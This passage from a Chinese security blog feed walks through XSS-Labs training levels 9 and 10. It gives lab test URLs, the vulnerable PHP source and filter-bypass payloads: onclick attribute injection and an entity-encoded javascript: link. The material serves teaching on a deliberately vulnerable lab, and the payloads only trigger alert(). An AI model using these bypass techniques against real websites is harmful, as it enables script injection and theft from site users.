<span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由22、26行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由19-21、27行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的尖括号进行过滤后赋值给<code>name=t_ref</code>的<code>a</code>标签的<code>value</code>值。</li></ul></li><li><p>所以含有的尖括号的注入无效，但其他不含尖括号构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"<span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level10</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level10/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level10/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level10/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level10<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level10<span class="token punctuation">.</span>php<span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level10/注入点检测1.png" alt="注入点检测1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level10/注入点检测2.png" alt="注入点检测2"></center><p>由上述操作可以推断，程序对<code>h2</code>标签中参数的尖括号进行了转义，而对<code>input</code>标签参数中的尖括号进行了过滤，使用不带尖括号的事件可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level10<span class="token punctuation">.</span>php<span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level10/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level11.php?keyword=good job!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level10<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level10<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>search</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level10.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由21行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由18-20、25行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的尖括号进行过滤后赋值给<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以含有的尖括号的注入无效，但其他不含尖括号的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">?</span>t_sort<span class="token operator">=</span>click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level9</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level9/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level9/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level9/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level9<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href+""/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level9<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">+</span>href<span class="token operator">/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level9/注入点jaince.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>input</code>标签中参数的尖括号进行了转义，而对<code>a</code>标签参数中的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行转换，还添加了对<code>http://</code>的验证，使用添加了<code>http://</code>的HTML实体编码可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level9<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>javasc<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">2382</span><span class="token operator">%</span>3bipt<span class="token operator">%</span><span class="token number">3</span><span class="token function">aalert</span><span class="token punctuation">(</span><span class="token string">'http%3a%2f%2fxss'</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level9/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level10.php?keyword=well done!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level9<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level9<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> '<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level9.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.htmlspecialchars($str).<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>添加友情链接</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level9.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由26行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17-23、31-40行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>、<code>&quot;</code>进行转换后查看是否含有<code>http://</code>后赋值给<code>a</code>标签的<code>href</code>值。</li></ul></li><li><p>所以含有的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>、<code>&quot;</code>(无论大小写)的注入无效，但其他使用含有<code>http://</code>HTML实体编码构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">javasc<span class="token operator">&amp;</span>#<span class="token number">82</span><span class="token punctuation">;</span>ipt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'http://xss'</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a 